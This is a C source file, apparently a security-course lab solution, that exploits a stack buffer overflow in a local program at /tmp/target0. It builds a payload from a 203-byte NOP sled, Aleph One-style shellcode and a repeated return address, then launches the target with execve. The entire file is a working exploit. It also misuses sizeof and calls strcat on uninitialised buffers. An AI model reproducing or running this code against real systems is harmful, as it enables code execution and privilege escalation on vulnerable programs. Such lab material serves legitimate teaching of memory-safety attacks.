#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target0"

char *repeat(char *s, int x)
{
  //from https://stackoverflow.com/a/22599676/5552894
  char *result = malloc(sizeof(s) * x + 1);
  while (x > 0) {
      strcat(result, s);
      x --;
  }
  return result;
}

int main(void)
{
  char *args[3]; 
  char *env[1];

  char *noop = "\x90";
  char *address = "\x2c\xfb\xff\xbf";
  int sled_length = 203;

  char *result = malloc(sizeof(noop)*sled_length + sizeof(shellcodeAlephOne) + sizeof(address)*38 + 1);
  
  char *result1 = repeat(noop, sled_length);
  strcat(result, result1);

  strcat(result, shellcodeAlephOne);

  char *result2 = repeat(address, 38);
  strcat(result, result2);
  
  //char *result = repeat("A", 399);
  //printf("result : %s\n", result);
  
  args[0] = TARGET;
  args[1] = result;
  /*"\x90"x203 + shellcodeAlephOne + "\xf8\xf2\xff\xbf"x38*/
  args[2] = NULL;
  
  env[0] = NULL;
  execve(TARGET, args, env);
  fprintf(stderr, "execve failed.\n");

  return 0;
}


